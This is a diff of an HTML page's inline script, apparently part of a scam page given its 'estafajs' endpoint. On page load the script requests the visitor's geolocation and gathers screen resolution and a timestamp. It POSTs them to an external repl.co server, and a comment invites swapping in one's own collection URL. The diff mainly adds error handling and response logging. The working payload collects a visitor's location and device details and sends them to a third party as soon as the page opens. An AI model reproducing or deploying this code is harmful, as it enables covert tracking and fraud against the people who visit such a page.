@@ -11,7 +11,7 @@
     <script>
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData);
+                navigator.geolocation.getCurrentPosition(sendData, errorHandler);
             } else {
                 sendData(null);
             }
@@ -25,7 +25,7 @@
                 screenResolution: `${screen.width}x${screen.height}`,
                 timestamp: new Date().toISOString()
             };
-            
+
             if (position) {
                 data.location = {
                     latitude: position.coords.latitude,
@@ -35,16 +35,30 @@
                 data.location = null;
             }
 
-            fetch('https://estafajs.ignaciojavierja.repl.co', {
+            fetch('https://estafajs.ignaciojavierja.repl.co', { // Reemplaza con tu URL de Repl.it
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
             });
+        }
+
+        function errorHandler(error) {
+            console.error('Geolocation error:', error);
         }
 
         getLocation();
     </script>
 </body>
 </html>
+
+
+
